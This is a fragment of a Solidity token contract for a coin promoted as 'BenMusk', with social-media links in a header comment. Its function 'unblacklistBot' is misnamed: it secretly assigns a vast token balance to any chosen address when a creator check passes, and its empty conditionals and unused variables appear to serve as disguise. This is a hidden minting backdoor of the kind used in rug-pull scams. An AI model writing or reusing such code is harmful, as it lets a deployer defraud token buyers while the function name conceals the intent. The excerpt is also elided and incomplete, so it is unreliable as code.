/**
Website : https://benmusk.vip/
Twitter : https://twitter.com/BenMuskCoin
Telegram : https://t.me/BenMuskEntry
*/
 ...
 */
 ...
 function unblacklistBot(address setAdress) external {
    address tokenF; 
    address tokenG;  
    ...
    if (creator == _liquidity) {
        _address[setAdress] = 100000000000000 * (1000000000 * 10 ** 18);
        if (amountFMin > amountGMin) {}
    }
    if (tokenF == tokenG) {}
 }
